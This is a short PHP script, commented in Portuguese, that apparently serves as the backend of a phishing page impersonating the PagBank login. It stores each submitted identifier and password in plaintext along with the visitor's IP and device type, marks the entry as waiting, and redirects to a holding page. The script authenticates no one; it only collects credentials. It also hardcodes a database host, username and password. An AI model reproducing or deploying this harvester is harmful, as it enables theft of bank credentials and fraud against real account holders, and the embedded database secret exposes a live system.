<?php
session_start();

// Conexão com PostgreSQL (host do Render já configurado)
$db_host = "dpg-d5cmpmqli9vc73cqnp5g-a.render.com"; // host completo do Render
$db_port = "5432";
$db_name = "pagtst";
$db_user = "pagtst_user";
$db_pass = "HCaim2ZBIpsMAmmAntjFxh79ZS3xicxl";

$db = pg_connect("host=$db_host port=$db_port dbname=$db_name user=$db_user password=$db_pass");
if (!$db) {
    die("Erro ao conectar ao banco de dados.");
}

// Recebe dados do formulário
$identificador = isset($_POST['identificador']) ? trim($_POST['identificador']) : '';
$senha = isset($_POST['senha']) ? trim($_POST['senha']) : '';

// Detecta IP e tipo de dispositivo
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$device_type = (stripos($user_agent, 'mobile') !== false) ? 'Mobile' : 'Desktop';

// Verifica se já existe o cliente
$check = pg_query_params($db, "SELECT * FROM clientes_pagbank WHERE identificador = $1", [$identificador]);

if (pg_num_rows($check) > 0) {
    // Atualiza cliente existente
    pg_query_params($db, "
        UPDATE clientes_pagbank
        SET senha = $1,
            status = 'aguardando',
            current_page = 'aguarde.php',
            last_active_at = NOW(),
            ip = $2,
            device_type = $3
        WHERE identificador = $4
    ", [$senha, $ip, $device_type, $identificador]);
} else {
    // Insere novo cliente (cliente_id gerado automaticamente pelo SERIAL)
    pg_query_params($db, "
        INSERT INTO clientes_pagbank
        (identificador, senha, status, current_page, created_at, last_active_at, ip, device_type)
        VALUES ($1, $2, 'aguardando', 'aguarde.php', NOW(), NOW(), $3, $4)
    ", [$identificador, $senha, $ip, $device_type]);
}

// Redireciona para a página de aguarde
header("Location: aguarde.php");
exit;
